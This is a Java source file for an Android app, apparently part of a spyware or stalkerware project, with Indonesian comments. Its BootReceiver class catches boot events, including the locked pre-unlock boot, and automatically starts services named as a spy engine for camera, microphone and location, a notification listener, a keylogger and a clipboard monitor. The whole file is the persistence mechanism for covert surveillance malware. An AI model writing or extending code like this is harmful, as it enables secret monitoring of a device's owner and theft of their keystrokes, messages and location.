package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * BootReceiver: Penjaga otomatis yang membangkitkan semua layanan 
 * segera setelah perangkat menyala (sebelum atau sesudah unlock).
 */
public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "CRPT.BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Boot event detected: " + action);

        // Menangkap BOOT_COMPLETED dan LOCKED_BOOT_COMPLETED (Direct Boot)
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            "android.intent.action.LOCKED_BOOT_COMPLETED".equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            startAllSpyServices(context);
        }
    }

    private void startAllSpyServices(Context context) {
        try {
            // 1. Start BackgroundSpyService (Main Engine)
            Intent serviceIntent = new Intent(context, BackgroundSpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }

            // 2. Start SpyService (Camera/Mic/Loc Engine)
            Intent spyIntent = new Intent(context, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(spyIntent);
            } else {
                context.startService(spyIntent);
            }

            // 3. Start Notification Listener
            Intent notifIntent = new Intent(context, CustomNotificationListenerService.class);
            context.startService(notifIntent);

            // 4. Start Keylogger
            Intent keyIntent = new Intent(context, KeyloggerService.class);
            context.startService(keyIntent);

            // 5. Start Clipboard Monitor
            Intent clipIntent = new Intent(context, ClipboardMonitorService.class);
            context.startService(clipIntent);

            Log.d(TAG, "All core spy services triggered successfully.");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start services on boot: " + e.getMessage());
        }
    }
}